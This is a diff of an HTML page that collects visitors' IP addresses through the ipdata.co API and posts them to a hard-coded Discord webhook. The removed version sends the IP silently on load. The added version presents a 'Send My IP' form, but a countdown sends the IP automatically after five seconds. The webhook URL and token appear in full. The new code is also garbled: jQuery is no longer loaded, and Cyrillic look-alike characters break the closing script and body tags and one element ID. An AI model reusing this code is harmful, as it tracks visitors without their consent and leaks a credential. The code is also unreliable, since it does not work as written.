@@ -2,22 +2,83 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Send My IP to Discord</title>
+    <title>Advanced IP Sender to Discord</title>
 </head>
-<body onload="sendToDiscord()">
-    <h1>Thanks for visiting! Your IP has been sent to Discord.</h1>
-</body>
+<body id="app" class="loading">
+    <div class="container">
+        <!-- Header -->
+        <header>
+            <h2><a href="#">IP Address to Discord Webhook</a></h2>
+        </header>
 
-<script src="//ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-<script>
-function sendToDiscord() {
-    $.getJSON("https://api.ipdata.co", function(data){
-        // Replace WEBHOOK_URL with your Discord Webhook URL obtained from Discord API.
-        var messageData = JSON.stringify({content: "The visitor's IP address is " + data.connection.client_ip});
-        fetch('https://discord.com/api/webhooks/1302684161852702730/YiE1EIC9F0U5ayDfXEdhSi4H1tiNilrSysfPTpFRJ6BEZ5jdia5QwHaYbf4oSlj8zgvp', {method: 'POST', headers:{ 'Content-Type': 'application/json'}, body:messageData})
-            .then(() => console.log('Sent message to Discord'))
-            .catch(error => console.error('Error while sending message: ', error));
-    });
-}
-</script>
+        <!-- Main Content -->
+        <main>
+            <form>
+                <label for="discordWebhookUrl">Discord Webhook URL:</label><br />
+                <input type="text" value="https://discord.com/api/webhooks/1302684161852702730/YiE1EIC9F0U5ayDfXEdhSi4H1tiNilrSysfPTpFRJ6BEZ5jdia5QwHaYbf4oSlj8zgvp" disabled id="discordWebhookUrl" name="discordWebhookUrl"><br /><br />
+
+                <label for="customMessage">Custom Message (optional):</label><br />
+                <textarea rows="5" cols="45" id="customMessage"></textarea><br /><br />
+
+                <button onclick="sendIpToDiscord()">Send My IP</button>
+            </form>
+        </main>
+
+        <!-- Footer -->
+        <footer>
+            <!-- Timer display element -->
+            <span class="timer" id="timeRemaining">Counting down...</span>
+        </footer>
+    </div>
+
+    <style>
+        /* CSS styles */
+        *{box-sizing: border-box;}
+        body {font-family: Arial; margin: 0px;}
+        .container {width: 70%; max-width: 960px; margin: auto;}
+        header h2 a {color: #fff; text-decoration: none;}
+        main form label, main form button {display: block;}
+        input[type=text], textarea {margin-bottom: 20px;}
+    </style>
+
+    <script>
+    $(document).ready(function(){
+      // Get initial time left
+      const timeLeft = 5;
+      let intervalId;
+
+      function startTimer() {
+          let remainingSeconds = timeLeft;
+          intervalId = setInterval(() => {
+              if (remainingSeconds <= 0) {
+                  clearInterval(intervalId);
+                  $("#timeRemaining").html("Sending...");
+                  sendIpToDiscord();
+              } else {
+                  $("#timeRemaining").html(`${remainingSeconds} seconds remaining`);
+                  remainingSeconds--;
+              }
+          }, 1000);
+      }
+
+      function sendIpToDiscord() {
+          $.getJSON("https://api.ipdata.co", data => {
+              const custom_message = $("#customMessage").val() || "";
+              const jsonData = JSON.stringify({content:`Your IP is ${data.connection.client_ip}, Custom Message: ${custom_message}`});
+
+              fetch('https://discord.com/api/webhooks/1302684161852702730/YiE1EIC9F0U5ayDfXEdhSi4H1tiNilrSysfPTpFRJ6BEZ5jdia5QwHaYbf4oSlj8zgvp', {method:'POST', headers:{ 'Content-Type': 'application/json'}, body:jsonData})
+                  .then(response => response.json())
+                  .then(data => console.log('Successfully sent'))
+                  .catch(error => console.error('Error while sending message: ', error));
+          });
+      }
+
+      // Start counting down when page loads
+      startTimer();
+
+      // Resetting form values on page load
+      $("#customMesсage").val("");
+    })
+    </scrипт>
+</bodу>
 </html>
